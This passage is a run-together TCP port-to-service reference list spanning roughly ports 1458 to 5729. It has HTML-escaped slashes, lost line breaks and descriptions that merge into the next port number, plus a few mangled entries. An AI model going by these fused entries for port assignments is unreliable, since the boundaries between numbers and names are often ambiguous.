Manager1458&#x2F;tcp nrcabq-lm Nichols Research Corp.1459&#x2F;tcp proshare1 Proshare Notebook Application1460&#x2F;tcp proshare2 Proshare Notebook Application1461&#x2F;tcp ibm_wrless_lan IBM Wireless LAN1462&#x2F;tcp world-lm World License Manager1463&#x2F;tcp nucleus Nucleus1464&#x2F;tcp msl_lmd MSL License Manager1465&#x2F;tcp pipes Pipes Platform1466&#x2F;tcp oceansoft-lm Ocean Software License Manager1467&#x2F;tcp csdmbase CSDMBASE1468&#x2F;tcp csdm CSDM1469&#x2F;tcp aal-lm Active Analysis Limited License Manager1470&#x2F;tcp uaiact Universal Analytics1471&#x2F;tcp csdmbase csdmbase1472&#x2F;tcp csdm csdm1473&#x2F;tcp openmath OpenMath1474&#x2F;tcp telefinder Telefinder1475&#x2F;tcp taligent-lm Taligent License Manager1476&#x2F;tcp clvm-cfg clvm-cfg1477&#x2F;tcp ms-sna-server ms-sna-server1478&#x2F;tcp ms-sna-base ms-sna-base1479&#x2F;tcp dberegister dberegister1480&#x2F;tcp pacerforum PacerForum1481&#x2F;tcp airs AIRS1482&#x2F;tcp miteksys-lm Miteksys License Manager1483&#x2F;tcp afs AFS License Manager1484&#x2F;tcp confluent Confluent License Manager1485&#x2F;tcp lansource LANSource1486&#x2F;tcp nms_topo_serv nms_topo_serv1487&#x2F;tcp localinfosrvr LocalInfoSrvr1488&#x2F;tcp docstor DocStor1489&#x2F;tcp dmdocbroker dmdocbroker1490&#x2F;tcp insitu-conf insitu-conf1491&#x2F;tcp anynetgateway anynetgateway1492&#x2F;tcp stone-design-1 stone-design-11493&#x2F;tcp netmap_lm netmap_lm1494&#x2F;tcp ica ica1495&#x2F;tcp cvc cvc1496&#x2F;tcp liberty-lm liberty-lm1497&#x2F;tcp rfx-lm rfx-lm1498&#x2F;tcp sybase-sqlany Sybase SQL Any1499&#x2F;tcp fhc Federico Heinz Consultora1500&#x2F;tcp vlsi-lm VLSI License Manager1501&#x2F;tcp saiscm Satellite-data Acquisition System 31502&#x2F;tcp shivadiscovery Shiva1503&#x2F;tcp imtc-mcs Databeam1504&#x2F;tcp evb-elm EVB Software Engineering License Manager1505&#x2F;tcp funkproxy Funk Software, Inc.1506&#x2F;tcp utcd Universal Time daemon (utcd)1507&#x2F;tcp symplex symplex1508&#x2F;tcp diagmond diagmond1509&#x2F;tcp robcad-lm Robcad, Ltd. License Manager1510&#x2F;tcp mvx-lm Midland Valley Exploration Ltd. Lic. Man.1511&#x2F;tcp 3l-l1 3l-l11512&#x2F;tcp wins Microsoft‘s Windows Internet Name Service1513&#x2F;tcp fujitsu-dtc Fujitsu Systems Business of America, Inc1514&#x2F;tcp fujitsu-dtcns Fujitsu Systems Business of America, Inc1515&#x2F;tcp ifor-protocol ifor-protocol1516&#x2F;tcp vpad Virtual Places Audio data1517&#x2F;tcp vpac Virtual Places Audio control1518&#x2F;tcp vpvd Virtual Places Video data1519&#x2F;tcp vpvc Virtual Places Video control1520&#x2F;tcp atm-zip-office atm zip office1521&#x2F;tcp ncube-lm nCube License Manager1522&#x2F;tcp ricardo-lm Ricardo North America License Manager1523&#x2F;tcp cichild-lm cichild1525&#x2F;tcp orasrv oracle1525&#x2F;tcp prospero-np Prospero Directory Service non-priv1526&#x2F;tcp pdap-np Prospero Data Access Prot non-priv1527&#x2F;tcp tlisrv oracle1528&#x2F;tcp mciautoreg micautoreg1529&#x2F;tcp coauthor oracle1530&#x2F;tcp rap-service rap-service1531&#x2F;tcp rap-listen rap-listen1532&#x2F;tcp miroconnect miroconnect1533&#x2F;tcp virtual-places Virtual Places Software1534&#x2F;tcp micromuse-lm micromuse-lm1535&#x2F;tcp ampr-info ampr-info1536&#x2F;tcp ampr-inter ampr-inter1537&#x2F;tcp sdsc-lm isi-lm1538&#x2F;tcp 3ds-lm 3ds-lm1539&#x2F;tcp intellistor-lm Intellistor License Manager1540&#x2F;tcp rds rds1541&#x2F;tcp rds2 rds21542&#x2F;tcp gridgen-elmd gridgen-elmd1543&#x2F;tcp simba-cs simba-cs1544&#x2F;tcp aspeclmd aspeclmd1545&#x2F;tcp vistium-share vistium-share1546&#x2F;tcp abbaccuray abbaccuray1547&#x2F;tcp laplink laplink1548&#x2F;tcp axon-lm Axon License Manager1549&#x2F;tcp shivahose Shiva Hose1550&#x2F;tcp 3m-image-lm Image Storage license manager 3M Company1551&#x2F;tcp hecmtl-db HECMTL-DB1552&#x2F;tcp pciarray pciarray1553&#x2F;tcp sna-cs sna-cs1554&#x2F;tcp caci-lm CACI Products Company License Manager1555&#x2F;tcp livelan livelan1556&#x2F;tcp ashwin AshWin CI Tecnologies1557&#x2F;tcp arbortext-lm ArborText License Manager1558&#x2F;tcp xingmpeg xingmpeg1559&#x2F;tcp web2host web2host1560&#x2F;tcp asci-val asci-val1561&#x2F;tcp facilityview facilityview1562&#x2F;tcp pconnectmgr pconnectmgr1563&#x2F;tcp cadabra-lm Cadabra License Manager1564&#x2F;tcp pay-per-view Pay-Per-View1565&#x2F;tcp winddlb WinDD1566&#x2F;tcp corelvideo CORELVIDEO1567&#x2F;tcp jlicelmd jlicelmd1568&#x2F;tcp tsspmap tsspmap1569&#x2F;tcp ets ets1570&#x2F;tcp orbixd orbixd1571&#x2F;tcp rdb-dbs-disp Oracle Remote Data Base1572&#x2F;tcp chip-lm Chipcom License Manager1573&#x2F;tcp itscomm-ns itscomm-ns1574&#x2F;tcp mvel-lm mvel-lm1575&#x2F;tcp oraclenames oraclenames1576&#x2F;tcp moldflow-lm moldflow-lm1577&#x2F;tcp hypercube-lm hypercube-lm1578&#x2F;tcp jacobus-lm Jacobus License Manager1579&#x2F;tcp ioc-sea-lm ioc-sea-lm1580&#x2F;tcp tn-tl-r1 tn-tl-r11581&#x2F;tcp mil-2045-47001 MIL-2045-470011582&#x2F;tcp msims MSIMS1583&#x2F;tcp simbaexpress simbaexpress1584&#x2F;tcp tn-tl-fd2 tn-tl-fd21585&#x2F;tcp intv intv1586&#x2F;tcp ibm-abtact ibm-abtact1587&#x2F;tcp pra_elmd pra_elmd1588&#x2F;tcp triquest-lm triquest-lm1589&#x2F;tcp vqp VQP1590&#x2F;tcp gemini-lm gemini-lm1591&#x2F;tcp ncpm-pm ncpm-pm1592&#x2F;tcp commonspace commonspace1593&#x2F;tcp mainsoft-lm mainsoft-lm1594&#x2F;tcp sixtrak sixtrak1595&#x2F;tcp radio radio1596&#x2F;tcp radio-sm radio-sm1597&#x2F;tcp orbplus-iiop orbplus-iiop1598&#x2F;tcp picknfs picknfs1599&#x2F;tcp simbaservices simbaservices1600&#x2F;tcp issd1601&#x2F;tcp aas aas1602&#x2F;tcp inspect inspect1603&#x2F;tcp picodbc pickodbc1604&#x2F;tcp icabrowser icabrowser1605&#x2F;tcp slp Salutation Manager (Salutation Protocol)1606&#x2F;tcp slm-api Salutation Manager (SLM-API)1607&#x2F;tcp stt stt1608&#x2F;tcp smart-lm Smart Corp. License Manager1609&#x2F;tcp isysg-lm isysg-lm1610&#x2F;tcp taurus-wh taurus-wh1611&#x2F;tcp ill Inter Library Loan1612&#x2F;tcp netbill-trans NetBill Transaction Server1613&#x2F;tcp netbill-keyrep NetBill Key Repository1614&#x2F;tcp netbill-cred NetBill Credential Server1615&#x2F;tcp netbill-auth NetBill Authorization Server1616&#x2F;tcp netbill-prod NetBill Product Server1617&#x2F;tcp nimrod-agent Nimrod Inter-Agent Communication1618&#x2F;tcp skytelnet skytelnet1619&#x2F;tcp xs-openstorage xs-openstorage1620&#x2F;tcp faxportwinport faxportwinport1621&#x2F;tcp softdataphone softdataphone1622&#x2F;tcp ontime ontime1623&#x2F;tcp jaleosnd jaleosnd1624&#x2F;tcp udp-sr-port udp-sr-port1625&#x2F;tcp svs-omagent svs-omagent1636&#x2F;tcp cncp CableNet Control Protocol1637&#x2F;tcp cnap CableNet Admin Protocol1638&#x2F;tcp cnip CableNet Info Protocol1639&#x2F;tcp cert-initiator cert-initiator1640&#x2F;tcp cert-responder cert-responder1641&#x2F;tcp invision InVision1642&#x2F;tcp isis-am isis-am1643&#x2F;tcp isis-ambc isis-ambc1645&#x2F;tcp datametrics datametrics1646&#x2F;tcp sa-msg-port sa-msg-port1647&#x2F;tcp rsap rsap1648&#x2F;tcp concurrent-lm concurrent-lm1649&#x2F;tcp inspect inspect1650&#x2F;tcp nkd nkd1651&#x2F;tcp shiva_confsrvr shiva_confsrvr1652&#x2F;tcp xnmp xnmp1653&#x2F;tcp alphatech-lm alphatech-lm1654&#x2F;tcp stargatealerts stargatealerts1655&#x2F;tcp dec-mbadmin dec-mbadmin1656&#x2F;tcp dec-mbadmin-h dec-mbadmin-h1657&#x2F;tcp fujitsu-mmpdc fujitsu-mmpdc1658&#x2F;tcp sixnetudr sixnetudr1659&#x2F;tcp sg-lm Silicon Grail License Manager1660&#x2F;tcp skip-mc-gikreq skip-mc-gikreq1661&#x2F;tcp netview-aix-1 netview-aix-11662&#x2F;tcp netview-aix-2 netview-aix-21663&#x2F;tcp netview-aix-3 netview-aix-31664&#x2F;tcp netview-aix-4 netview-aix-41665&#x2F;tcp netview-aix-5 netview-aix-51666&#x2F;tcp netview-aix-6 netview-aix-61667&#x2F;tcp netview-aix-7 netview-aix-71668&#x2F;tcp netview-aix-8 netview-aix-81669&#x2F;tcp netview-aix-9 netview-aix-91670&#x2F;tcp netview-aix-10 netview-aix-101671&#x2F;tcp netview-aix-11 netview-aix-111672&#x2F;tcp netview-aix-12 netview-aix-121673&#x2F;tcp proshare-mc-1 Intel Proshare Multicast1674&#x2F;tcp proshare-mc-2 Intel Proshare Multicast1675&#x2F;tcp pdp Pacific Data Products1676&#x2F;tcp netcomm1 netcomm11677&#x2F;tcp groupwise groupwise1678&#x2F;tcp prolink prolink1679&#x2F;tcp darcorp-lm darcorp-lm1681&#x2F;tcp sd-elmd sd-elmd1682&#x2F;tcp lanyon-lantern lanyon-lantern1683&#x2F;tcp ncpm-hip ncpm-hip1684&#x2F;tcp snaresecure SnareSecure1685&#x2F;tcp n2nremote n2nremote1686&#x2F;tcp cvmon cvmon1687&#x2F;tcp nsjtp-ctrl nsjtp-ctrl1688&#x2F;tcp nsjtp-data nsjtp-data1689&#x2F;tcp firefox firefox1690&#x2F;tcp ng-umds ng-umds1691&#x2F;tcp empire-empuma empire-empuma1692&#x2F;tcp sstsys-lm sstsys-lm1693&#x2F;tcp rrirtr rrirtr1694&#x2F;tcp rrimwm rrimwm1695&#x2F;tcp rrilwm rrilwm1696&#x2F;tcp rrifmm rrifmm1697&#x2F;tcp rrisat rrisat1698&#x2F;tcp rsvp-encap-1 RSVP-ENCAPSULATION-11699&#x2F;tcp rsvp-encap-2 RSVP-ENCAPSULATION-21700&#x2F;tcp mps-raft mps-raft1701&#x2F;tcp l2f,l2tp l2f,l2tp1702&#x2F;tcp deskshare deskshare1703&#x2F;tcp hb-engine hb-engine1704&#x2F;tcp bcs-broker bcs-broker1705&#x2F;tcp slingshot slingshot1706&#x2F;tcp jetform jetform1707&#x2F;tcp vdmplay vdmplay1708&#x2F;tcp gat-lmd gat-lmd1709&#x2F;tcp centra centra1710&#x2F;tcp impera impera1711&#x2F;tcp pptconference pptconference1712&#x2F;tcp registrar resource monitoring service1713&#x2F;tcp conferencetalk ConferenceTalk1714&#x2F;tcp sesi-lm sesi-lm1715&#x2F;tcp houdini-lm houdini-lm1716&#x2F;tcp xmsg xmsg1717&#x2F;tcp fj-hdnet fj-hdnet1718&#x2F;tcp h323gatedisc h323gatedisc1719&#x2F;tcp h323gatestat h323gatestat1720&#x2F;tcp h323hostcall h323hostcall1721&#x2F;tcp caicci caicci1722&#x2F;tcp hks-lm HKS License Manager1723&#x2F;tcp pptp pptp1724&#x2F;tcp csbphonemaster csbphonemaster1725&#x2F;tcp iden-ralp iden-ralp1726&#x2F;tcp iberiagames IBERIAGAMES1727&#x2F;tcp winddx winddx1728&#x2F;tcp telindus TELINDUS1729&#x2F;tcp citynl CityNL License Management1730&#x2F;tcp roketz roketz1731&#x2F;tcp msiccp MSICCP1732&#x2F;tcp proxim proxim1733&#x2F;tcp siipat SIMS - SIIPAT Protocol for Alarm Transmission1734&#x2F;tcp cambertx-lm Camber Corporation License Management1735&#x2F;tcp privatechat PrivateChat1736&#x2F;tcp street-stream street-stream1737&#x2F;tcp ultimad ultimad1738&#x2F;tcp gamegen1 GameGen11739&#x2F;tcp webaccess webaccess1740&#x2F;tcp encore encore1741&#x2F;tcp cisco-net-mgmt cisco-net-mgmt1742&#x2F;tcp 3Com-nsd 3Com-nsd1743&#x2F;tcp cinegrfx-lm Cinema Graphics License Manager1744&#x2F;tcp ncpm-ft ncpm-ft1745&#x2F;tcp remote-winsock remote-winsock1746&#x2F;tcp ftrapid-1 ftrapid-11747&#x2F;tcp ftrapid-2 ftrapid-21748&#x2F;tcp oracle-em1 oracle-em11749&#x2F;tcp aspen-services aspen-services1750&#x2F;tcp sslp Simple Socket Library‘s PortMaster1751&#x2F;tcp swiftnet SwiftNet1752&#x2F;tcp lofr-lm Leap of Faith Research License Manager1753&#x2F;tcp translogic-lm Translogic License Manager1754&#x2F;tcp oracle-em2 oracle-em21755&#x2F;tcp ms-streaming ms-streaming1756&#x2F;tcp capfast-lmd capfast-lmd1757&#x2F;tcp cnhrp cnhrp1758&#x2F;tcp tftp-mcast tftp-mcast1759&#x2F;tcp spss-lm SPSS License Manager1760&#x2F;tcp www-ldap-gw www-ldap-gw1761&#x2F;tcp cft-0 cft-01762&#x2F;tcp cft-1 cft-11763&#x2F;tcp cft-2 cft-21764&#x2F;tcp cft-3 cft-31765&#x2F;tcp cft-4 cft-41766&#x2F;tcp cft-5 cft-51767&#x2F;tcp cft-6 cft-61768&#x2F;tcp cft-7 cft-71769&#x2F;tcp bmc-net-adm bmc-net-adm1770&#x2F;tcp bmc-net-svc bmc-net-svc1771&#x2F;tcp vaultbase vaultbase1772&#x2F;tcp essweb-gw EssWeb Gateway1773&#x2F;tcp kmscontrol KMSControl1774&#x2F;tcp global-dtserv global-dtserv1776&#x2F;tcp femis Federal Emergency Management Information System1777&#x2F;tcp powerguardian powerguardian1779&#x2F;tcp pharmasoft pharmasoft1780&#x2F;tcp dpkeyserv dpkeyserv1781&#x2F;tcp answersoft-lm answersoft-lm1782&#x2F;tcp hp-hcip hp-hcip1783&#x2F;tcp fjris Fujitsu Remote Install Service1784&#x2F;tcp finle-lm Finle License Manager1785&#x2F;tcp windlm Wind River Systems License Manager1786&#x2F;tcp funk-logger funk-logger1787&#x2F;tcp funk-license funk-license1788&#x2F;tcp psmond psmond1789&#x2F;tcp hello hello1790&#x2F;tcp nmsp Narrative Media Streaming Protocol1791&#x2F;tcp ea1 EA11792&#x2F;tcp ibm-dt-2 ibm-dt-21793&#x2F;tcp rsc-robot rsc-robot1794&#x2F;tcp cera-bcm cera-bcm1795&#x2F;tcp dpi-proxy dpi-proxy1796&#x2F;tcp vocaltec-admin Vocaltec Server Administration1797&#x2F;tcp uma UMA1798&#x2F;tcp etp Event Transfer Protocol1799&#x2F;tcp netrisk NETRISK1801&#x2F;tcp msmq Microsoft Message Que1804&#x2F;tcp enl ENL1807&#x2F;tcp fhsp Fujitsu Hot Standby Protocol1812&#x2F;tcp radius RADIUS1813&#x2F;tcp radius-acct RADIUS Accounting1814&#x2F;tcp tdp-suite TDP Suite1815&#x2F;tcp mmpft MMPFT1816&#x2F;tcp harp HARP1818&#x2F;tcp etftp Enhanced Trivial File Transfer Protocol1819&#x2F;tcp plato-lm Plato License Manager1820&#x2F;tcp mcagent mcagent1821&#x2F;tcp donnyworld donnyworld1822&#x2F;tcp es-elmd es-elmd1823&#x2F;tcp unisys-lm Unisys Natural Language License Manager1824&#x2F;tcp metrics-pas metrics-pas1850&#x2F;tcp gsi GSI1863&#x2F;tcp msnp MSNP1865&#x2F;tcp entp ENTP1901&#x2F;tcp fjicl-tep-a Fujitsu ICL Terminal Emulator Program A1902&#x2F;tcp fjicl-tep-b Fujitsu ICL Terminal Emulator Program B1903&#x2F;tcp linkname Local Link Name Resolution1904&#x2F;tcp fjicl-tep-c Fujitsu ICL Terminal Emulator Program C1905&#x2F;tcp sugp Secure UP.Link Gateway Protocol1906&#x2F;tcp tpmd TPortMapperReq1908&#x2F;tcp dawn Dawn1911&#x2F;tcp mtp Starlight Networks Multimedia Transport Protocol1913&#x2F;tcp armadp armadp1914&#x2F;tcp elm-momentum Elm-Momentum1915&#x2F;tcp facelink FACELINK1916&#x2F;tcp persona Persoft Persona1917&#x2F;tcp noagent nOAgent1921&#x2F;tcp noadmin NoAdmin1944&#x2F;tcp close-combat close-combat1945&#x2F;tcp dialogic-elmd dialogic-elmd1946&#x2F;tcp tekpls tekpls1947&#x2F;tcp hlserver hlserver1948&#x2F;tcp eye2eye eye2eye1949&#x2F;tcp ismaeasdaqlive ISMA Easdaq Live1950&#x2F;tcp ismaeasdaqtest ISMA Easdaq Test1951&#x2F;tcp bcs-lmserver bcs-lmserver1973&#x2F;tcp dlsrap Data Link Switching Remote Access Protocol1985&#x2F;tcp hsrp Hot Standby Router Protocol1986&#x2F;tcp licensedaemon cisco license management1987&#x2F;tcp tr-rsrb-p1 cisco RSRB Priority 1 port1988&#x2F;tcp tr-rsrb-p2 cisco RSRB Priority 2 port1989&#x2F;tcp tr-rsrb-p3 cisco RSRB Priority 3 port1989&#x2F;tcp mshnet MHSnet system1990&#x2F;tcp stun-p1 cisco STUN Priority 1 port1991&#x2F;tcp stun-p2 cisco STUN Priority 2 port1992&#x2F;tcp stun-p3 cisco STUN Priority 3 port1992&#x2F;tcp ipsendmsg IPsendmsg1993&#x2F;tcp snmp-tcp-port cisco SNMP TCP port1994&#x2F;tcp stun-port cisco serial tunnel port1995&#x2F;tcp perf-port cisco perf port1996&#x2F;tcp tr-rsrb-port cisco Remote SRB port1997&#x2F;tcp gdp-port cisco Gateway Discovery Protocol1998&#x2F;tcp x25-svc-port cisco X.25 service (XOT)1999&#x2F;tcp tcp-id-port cisco identification port2000&#x2F;tcp callbook2001&#x2F;tcp dc2002&#x2F;tcp globe2004&#x2F;tcp mailbox2005&#x2F;tcp berknet2007&#x2F;tcp dectalk2012&#x2F;tcp ttyinfo2013&#x2F;tcp raid-am2014&#x2F;tcp troff2015&#x2F;tcp cypress2025&#x2F;tcp ellpack2030&#x2F;tcp device22032&#x2F;tcp blackboard2033&#x2F;tcp glogger2035&#x2F;tcp imsldoc2040&#x2F;tcp lam2042&#x2F;tcp isis isis2044&#x2F;tcp rimsl2045&#x2F;tcp cdfunc2046&#x2F;tcp sdfunc2047&#x2F;tcp dls2049&#x2F;tcp shilp2049&#x2F;tcp nfs Network File System - Sun Microsystems2065&#x2F;tcp dlsrpn Data Link Switch Read Port Number2067&#x2F;tcp dlswpn Data Link Switch Write Port Number2090&#x2F;tcp lrp Load Report Protocol2091&#x2F;tcp prp PRP2102&#x2F;tcp zephyr-srv Zephyr server2103&#x2F;tcp zephyr-clt Zephyr serv-hm connection2104&#x2F;tcp zephyr-hm Zephyr hostmanager2105&#x2F;tcp minipay MiniPay2200&#x2F;tcp ici ICI2201&#x2F;tcp ats Advanced Training System Program2213&#x2F;tcp kali Kali2222&#x2F;tcp unreg-ab2 Allen-Bradley unregistered port2232&#x2F;tcp ivs-video IVS Video default2234&#x2F;tcp directplay DirectPlay2236&#x2F;tcp nani Nani2240&#x2F;tcp recipe RECIPe2241&#x2F;tcp ivsd IVS Daemon2242&#x2F;tcp foliocorp Folio Remote Server2279&#x2F;tcp xmquery xmquery2280&#x2F;tcp lnvpoller LNVPOLLER2281&#x2F;tcp lnvconsole LNVCONSOLE2282&#x2F;tcp lnvalarm LNVALARM2283&#x2F;tcp lnvstatus LNVSTATUS2284&#x2F;tcp lnvmaps LNVMAPS2285&#x2F;tcp lnvmailmon LNVMAILMON2286&#x2F;tcp nas-metering NAS-Metering2287&#x2F;tcp dna DNA2288&#x2F;tcp netml NETML2300&#x2F;tcp cvmmon CVMMON2307&#x2F;tcp pehelp pehelp2308&#x2F;tcp sdhelp sdhelp2313&#x2F;tcp iapp IAPP (Inter Access Point Protocol)2316&#x2F;tcp sent-lm SENT License Manager2321&#x2F;tcp rdlap RDLAP over UDP2322&#x2F;tcp ofsd ofsd2323&#x2F;tcp 3d-nfsd 3d-nfsd2326&#x2F;tcp idcp IDCP2327&#x2F;tcp xingcsm xingcsm2329&#x2F;tcp nvd NVD2330&#x2F;tcp tscchat TSCCHAT2333&#x2F;tcp snapp SNAPP2337&#x2F;tcp ideesrv ideesrv2344&#x2F;tcp fcmsys fcmsys2345&#x2F;tcp dbm dbm2356&#x2F;tcp gxtelmd GXT License Managemant2358&#x2F;tcp futrix Futrix2390&#x2F;tcp rsmtp RSMTP2396&#x2F;tcp wusage Wusage2397&#x2F;tcp ncl NCL2398&#x2F;tcp orbiter Orbiter2401&#x2F;tcp cvspserver cvspserver2407&#x2F;tcp orion Orion2412&#x2F;tcp cdn CDN2415&#x2F;tcp comtest COMTEST2418&#x2F;tcp cas cas2421&#x2F;tcp g-talk G-Talk2423&#x2F;tcp rnrp RNRP2427&#x2F;tcp stgcp Simple telephony Gateway Control Protocol2428&#x2F;tcp ott One Way Trip Time2429&#x2F;tcp ft-role FT-ROLE2430&#x2F;tcp venus venus2432&#x2F;tcp codasrv codasrv2436&#x2F;tcp topx TOP&#x2F;X2438&#x2F;tcp msp MSP2443&#x2F;tcp powerclientcsf PowerClient Central Storage Facility2445&#x2F;tcp dtn1 DTN12447&#x2F;tcp ovwdb OpenView NNM daemon2449&#x2F;tcp ratl RATL2451&#x2F;tcp netchat netchat2458&#x2F;tcp griffin griffin2500&#x2F;tcp rtsserv Resource Tracking system server2501&#x2F;tcp rtsclient Resource Tracking system client2528&#x2F;tcp ncr_ccl NCR CCL2529&#x2F;tcp utsftp UTS FTP2532&#x2F;tcp ovtopmd OVTOPMD2592&#x2F;tcp netrek netrek2628&#x2F;tcp dict DICT2634&#x2F;tcp pk-electronics PK Electronics2636&#x2F;tcp solve Solve2639&#x2F;tcp aminet AMInet2641&#x2F;tcp hdl-srv HDL Server2642&#x2F;tcp tragic Tragic2646&#x2F;tcp and-lm AND Licence Manager2653&#x2F;tcp sonus Sonus2655&#x2F;tcp unglue UNIX Nt Glue2656&#x2F;tcp kana Kana2700&#x2F;tcp tqdata tqdata2784&#x2F;tcp www-dev world wide web - development2785&#x2F;tcp aic-np aic-np2786&#x2F;tcp aic-oncrpc aic-oncrpc - Destiny MCD database2787&#x2F;tcp piccolo piccolo - Cornerstone Software2788&#x2F;tcp fryeserv NetWare Loadable Module - Seagate Software2789&#x2F;tcp media-agent Media Agent2908&#x2F;tcp mao mao2912&#x2F;tcp epicon Epicon2971&#x2F;tcp netclip Net Clip2974&#x2F;tcp signal Signal2975&#x2F;tcp fjmpcm Fujitsu Configuration Management Service3000&#x2F;tcp hbci HBCI3001&#x2F;tcp redwood-broker Redwood Broker3003&#x2F;tcp cgms CGMS3010&#x2F;tcp gw Telerate Workstation3012&#x2F;tcp twsdss Trusted Web Client3020&#x2F;tcp cifs CIFS3047&#x2F;tcp hlserver Fast Security HL Server3048&#x2F;tcp pctrader Sierra Net PC Trader3049&#x2F;tcp nsws NSWS3105&#x2F;tcp cardbox Cardbox3130&#x2F;tcp icpv2 ICPv23141&#x2F;tcp vmodem VMODEM3143&#x2F;tcp seaview Sea View3147&#x2F;tcp rfio RFIO3264&#x2F;tcp ccmail cc:mail&#x2F;lotus3266&#x2F;tcp ns-cfg-server NS CFG Server3267&#x2F;tcp ibm-dial-out IBM Dial Out3268&#x2F;tcp msft-gc Microsoft Global Catalog3273&#x2F;tcp sxmp Simple Extensible Multiplexed Protocol3275&#x2F;tcp samd SAMD3279&#x2F;tcp admind admind3281&#x2F;tcp sysopt SYSOPT3284&#x2F;tcp 4talk 4Talk3285&#x2F;tcp plato Plato3286&#x2F;tcp e-net E-Net3288&#x2F;tcp cops COPS3289&#x2F;tcp enpc ENPC3290&#x2F;tcp caps-lm CAPS LOGISTICS TOOLKIT - LM3291&#x2F;tcp sah-lm S A Holditch &amp; Associates - LM3293&#x2F;tcp fg-fps fg-fps3294&#x2F;tcp fg-gip fg-gip3296&#x2F;tcp rib-slm Rib License Manager3299&#x2F;tcp pdrncs pdrncs3304&#x2F;tcp opsession-srvr OP Session Server3306&#x2F;tcp?MySQL?mysql3309&#x2F;tcp tns-adv TNS ADV3313&#x2F;tcp uorb Unify Object Broker3314&#x2F;tcp uohost Unify Object Host3315&#x2F;tcp cdid CDID3318&#x2F;tcp ssrip Swith to Swith Routing Information Protocol3319&#x2F;tcp sdt-lmd SDT License Manager3321&#x2F;tcp vnsstr VNSSTR3326&#x2F;tcp sftu SFTU3327&#x2F;tcp bbars BBARS3328&#x2F;tcp egptlm Eaglepoint License Manager3329&#x2F;tcp hp-device-disc HP Device Disc3330&#x2F;tcp mcs-calypsoicf MCS Calypso ICF3333&#x2F;tcp dec-notes DEC Notes3338&#x2F;tcp anet-b OMF data b3339&#x2F;tcp anet-l OMF data l3340&#x2F;tcp anet-m OMF data m3341&#x2F;tcp anet-h OMF data h3342&#x2F;tcp webtie WebTIE3351&#x2F;tcp btrieve BTRIEVE3352&#x2F;tcp ssql SSQL3353&#x2F;tcp fatpipe FATPIPE3354&#x2F;tcp suitjd SUITJD3362&#x2F;tcp dj-ilm DJ ILM3372&#x2F;tcp tip2 TIP 23378&#x2F;tcp wsicopy WSICOPY3379&#x2F;tcp socorfs SOCORFS3381&#x2F;tcp geneous Geneous3383&#x2F;tcp esp-lm Enterprise Software Products License Manager3390&#x2F;tcp dsc Distributed Service Coordinator3391&#x2F;tcp savant SAVANT3392&#x2F;tcp efi-lm EFI License Management3395&#x2F;tcp dyna-lm Dyna License Manager (Elam)3421&#x2F;tcp bmap Bull Apprise portmapper3455&#x2F;tcp prsvp RSVP Port3456&#x2F;tcp vat VAT default data3457&#x2F;tcp vat-control VAT default control3900&#x2F;tcp udt_os Unidata UDT OS3984&#x2F;tcp mapper-nodemgr MAPPER network node manager3985&#x2F;tcp mapper-mapethd MAPPER TCP&#x2F;IP server3986&#x2F;tcp mapper-ws_ethd MAPPER workstation server4001&#x2F;tcp newoak NewOak4008&#x2F;tcp netcheque NetCheque accounting4096&#x2F;tcp bre BRE (Bridge Relay Element)4132&#x2F;tcp nuts_dem NUTS Daemon4133&#x2F;tcp nuts_bootp NUTS Bootp Server4143&#x2F;tcp oidsr Document Replication4321&#x2F;tcp rwhois Remote Who Is4343&#x2F;tcp unicall UNICALL4346&#x2F;tcp elanlm ELAN LM4348&#x2F;tcp itose ITOSE4444&#x2F;tcp krb524 KRB5244444&#x2F;tcp nv-video NV Video default4446&#x2F;tcp n1-fwp N1-FWP4449&#x2F;tcp privatewire PrivateWire4450&#x2F;tcp camp Camp4451&#x2F;tcp ctisystemmsg CTI System Msg4452&#x2F;tcp ctiprogramload CTI Program Load4500&#x2F;tcp sae-urn sae-urn4501&#x2F;tcp urn-x-cdchoice urn-x-cdchoice4546&#x2F;tcp sf-lm SF License Manager (Sentinel)4672&#x2F;tcp rfa remote file access server4800&#x2F;tcp iims Icona Instant Messenging System4801&#x2F;tcp iwec Icona Web Embedded Chat4802&#x2F;tcp ilss Icona License System Server4827&#x2F;tcp htcp HTCP4868&#x2F;tcp phrelay Photon Relay4885&#x2F;tcp abbs ABBS5002&#x2F;tcp rfe radio free ethernet5003&#x2F;tcp fmpro-internal FileMaker, Inc. - Proprietary transport5004&#x2F;tcp avt-profile-1 avt-profile-15005&#x2F;tcp avt-profile-2 avt-profile-25010&#x2F;tcp telelpathstart TelepathStart5020&#x2F;tcp zenginkyo-1 zenginkyo-15021&#x2F;tcp zenginkyo-2 zenginkyo-25050&#x2F;tcp mmcc multimedia conference control tool5060&#x2F;tcp sip SIP5150&#x2F;tcp atmp Ascend Tunnel Management Protocol5190&#x2F;tcp aol America-Online5191&#x2F;tcp aol-1 AmericaOnline15192&#x2F;tcp aol-2 AmericaOnline25193&#x2F;tcp aol-3 AmericaOnline35272&#x2F;tcp pk PK5300&#x2F;tcp hacl-hb # HA cluster heartbeat5301&#x2F;tcp hacl-gs # HA cluster general services5304&#x2F;tcp hacl-local # HA Cluster Commands5305&#x2F;tcp hacl-test # HA Cluster Test5307&#x2F;tcp sco-aip SCO AIP5310&#x2F;tcp outlaws Outlaws5311&#x2F;tcp tmlogin TM Login5400&#x2F;tcp excerpt Excerpt Search5402&#x2F;tcp mftp MFTP5404&#x2F;tcp hpoms-dps-lstn HPOMS-DPS-LSTN5407&#x2F;tcp foresyte-clear Foresyte-Clear5409&#x2F;tcp salient-dtasrv Salient Data Server5410&#x2F;tcp salient-usrmgr Salient User Manager5411&#x2F;tcp actnet ActNet5414&#x2F;tcp statusd StatusD5418&#x2F;tcp mcntp MCNTP5419&#x2F;tcp dj-ice DJ-ICE5500&#x2F;tcp fcp-addr-srvr1 fcp-addr-srvr15501&#x2F;tcp fcp-addr-srvr2 fcp-addr-srvr25502&#x2F;tcp fcp-srvr-inst1 fcp-srvr-inst15503&#x2F;tcp fcp-srvr-inst2 fcp-srvr-inst25504&#x2F;tcp fcp-cics-gw1 fcp-cics-gw15555&#x2F;tcp personal-agent Personal Agent5602&#x2F;tcp a1-msc A1-MSC5603&#x2F;tcp a1-bs A1-BS5631&#x2F;tcp pcanywheredata pcANYWHEREdata5632&#x2F;tcp pcanywherestat pcANYWHEREstat5678&#x2F;tcp rrac Remote Replication Agent Connection5679&#x2F;tcp dccm Direct Cable Connect Manager5713&#x2F;tcp proshareaudio proshare conf audio5714&#x2F;tcp prosharevideo proshare conf video5715&#x2F;tcp prosharedata proshare conf data5717&#x2F;tcp prosharenotify proshare conf notify5729&#x2F;tcp openmail Openmail User Agent 